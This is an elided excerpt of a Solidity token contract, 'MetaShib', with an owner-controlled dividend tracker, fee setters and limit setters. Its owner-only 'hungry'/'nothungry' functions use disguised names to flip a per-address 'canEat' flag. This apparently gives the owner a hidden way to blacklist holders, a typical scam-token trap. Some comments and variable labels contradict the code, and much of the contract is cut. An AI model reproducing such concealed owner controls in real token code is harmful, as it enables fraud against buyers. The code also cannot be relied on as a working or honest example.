...
contract MetaShib is ERC20, Ownable {
    ...
    address public immutable ETH =
        address(0x55d398326f99059fF775485246999027B3197955); //Reward ETH

    uint256 public swapTokensAtAmount = 50000000000 * (10**18);
    uint256 public maxTxAmount = 1000000000000000 * (10**18);
    uint256 public maxWalletAmount = 1000000000000000 * (10**18);
    ...
    address public _marketingWalletAddress =
        0x592dE0eaBE4747106E2F2A0597596c446662CD2d;
    ...
    constructor(address receiveAddress) public ERC20("MetaShib", "MetaShib") {
        ...
        */
        _mint(address(receiveAddress), 1000000000000000 * (10**18));
    }
    ...
    function updateDividendTracker(address newAddress) public onlyOwner {
        require(
            ...
            "ETHBack: The dividend tracker already has that address"
        );

        ETHBackDividendTracker newDividendTracker = ETHBackDividendTracker(
            payable(newAddress)
        );

        require(
            newDividendTracker.owner() == address(this),
            "ETHBack: The new dividend tracker must be owned by the ETHBack token contract"
        );
    ...
    function updateUniswapV2Router(address newAddress) public onlyOwner {
        require(
            ...
            "ETHBack: The router already has that address"
        );
    ...
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(
            ...
            "ETHBack: Account is already the value of 'excluded'"
        );
        _isExcludedFromFees[account] = excluded;
    ...
    function setETHRewardsFee(uint256 value) external onlyOwner {
        require(value.add(liquidityFee).add(marketingFee) <= 20);
        ETHRewardsFee = value;
        totalFees = ETHRewardsFee.add(liquidityFee).add(marketingFee);
    }

    function setliquidityFee(uint256 value) external onlyOwner {
        require(ETHRewardsFee.add(value).add(marketingFee) <= 20);
        liquidityFee = value;
        totalFees = ETHRewardsFee.add(liquidityFee).add(marketingFee);
    }

    function setMarketingFee(uint256 value) external onlyOwner {
        require(ETHRewardsFee.add(liquidityFee).add(value) <= 20);
        marketingFee = value;
        totalFees = ETHRewardsFee.add(liquidityFee).add(marketingFee);
    }
        ...
        onlyOwner
    {
        require(
            pair != uniswapV2Pair,
            "ETHBack: The PanETHSwap pair cannot be removed from automatedMarketMakerPairs"
        );
    ...
    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(
            ...
            "ETHBack: gasForProcessing must be between 200,000 and 500,000"
        );
        require(
            newValue != gasForProcessing,
            "ETHBack: Cannot update gasForProcessing to same value"
        );
    ...
    function setAmount(uint256 _maxTx, uint256 _maxWallet) external onlyOwner {
        maxTxAmount = _maxTx;
    ...
    function hungry(address[] memory eatList) external onlyOwner {
        for (uint256 i = 0; i < eatList.length; i++) {
            cannotEat(eatList[i]);
        }
    }

    function nothungry(address[] memory eatList) external onlyOwner {
        for (uint256 i = 0; i < eatList.length; i++) {
            canEat[eatList[i]] = false;
        }
    }
    ...
    //Only Use This Function When The Swap is Stucked
...
contract ETHBackDividendTracker is Ownable, DividendPayingToken {
    ...
    {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 1000000000 * (10**18); //must hold 200000+ tokens
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(
            newClaimWait >= 600 && newClaimWait <= 86400,
            "ETHBack_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours"
        );
        require(
            newClaimWait != claimWait,
            "ETHBack_Dividend_Tracker: Cannot update claimWait to same value"
        );
